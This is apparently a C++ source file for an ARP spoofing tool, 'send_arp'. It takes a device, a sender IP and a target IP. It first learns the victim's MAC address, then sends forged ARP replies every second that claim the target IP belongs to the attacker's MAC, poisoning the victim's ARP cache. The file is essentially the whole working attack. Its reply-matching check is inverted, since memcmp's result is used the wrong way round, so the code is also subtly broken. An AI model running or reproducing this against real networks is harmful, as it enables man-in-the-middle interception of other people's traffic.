#include <iostream>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <thread>
#include <unistd.h>
#include "jpcaplib.h"
#include "mac.h"
#include "ip.h"
#include "arp.h"
#include "printdata.hpp"

using namespace std;


uint8_t BROADCAST[ETHER_ADDR_LEN] = {0xff,0xff,0xff,0xff,0xff,0xff};

void usage()
{
    cout<<"./send_arp <device> <sender_ip> <target_ip>"<<endl;
    exit(1);
}

bool chkArgc(int argc)
{
    if(argc !=4)
        return false;

    return true;
}


struct NetInfo{
    Mac mac;
    Ip ip;
};

bool getRemoteHWaddr(pcap_t *pcd, const uint32_t *ip, uint8_t* mac_buf);


int main(int argc, char* argv[])
{
    if(!chkArgc(argc))
        usage();
    //set Device variable
    char* dev =argv[1];
    NetInfo host;
    NetInfo sender;

    //Get my MAC addr use socket IO
    host.mac.getMyMac(dev);


    //why dev init after this fuction call
    host.ip.getMyIp(dev);


    //Set Sender IP Addr to argv[2]
    sender.ip=argv[2];

    //init ARP request packet to get sender MAC addr
    Arp arp_request_packet;

    arp_request_packet.initEth(host.mac.retnMac(),(uint8_t*)(&BROADCAST),ETHERTYPE_ARP);
    arp_request_packet.initRequestARP(host.mac.retnMac(),host.ip.retnIP(), sender.ip.retnIP());

    pcap_t *pcd = pOpen(dev);

    //send request packet to host
    if(pcap_sendpacket(pcd,(uint8_t *)(&arp_request_packet),sizeof(arp_request_packet))!=0)
    {
        cout<<"pcap_sendpacket() error! "<<endl;
        exit(1);
    }

    //waiting until get senderIP
    while(!getRemoteHWaddr(pcd,sender.ip.retnIP(),sender.mac.retnMac()));

    //there is don't need to know target_mack
    Ip target_ip;
    target_ip=argv[3];
    Arp arp_reply_packet;
    arp_reply_packet.initEth(host.mac.retnMac(),sender.mac.retnMac(),ETHERTYPE_ARP);
    arp_reply_packet.initReplyARP(host.mac.retnMac(),sender.mac.retnMac(),target_ip.retnIP(),sender.ip.retnIP()); //sender Protocol IP set to target ip

    while(!pcap_sendpacket(pcd,(uint8_t*)&arp_reply_packet,sizeof(arp_reply_packet)))
    {
        sleep(1);
    }
    return 0;
}



bool getRemoteHWaddr(pcap_t* pcd, const uint32_t *ip, uint8_t *mac_buf)
{

    uint8_t* packet;
    int data_len;
    struct ether_arp *arp;
    while(recvPacket(pcd,&packet,data_len))
    {
        if(parseEther(&packet,data_len,ETHERTYPE_ARP))
        {
            arp = (struct ether_arp *)packet;
            //if ARP Sender IP equals IP
            uint32_t nIp= htonl(*ip);
            if(memcmp(arp->arp_spa,&nIp,INET_ADDR_LEN))
            {
                //copy MAC Addr to macBuf
                memcpy(mac_buf, arp->arp_sha,ETHER_ADDR_LEN);
                return true;
            }
        }
    }

   return false;

}


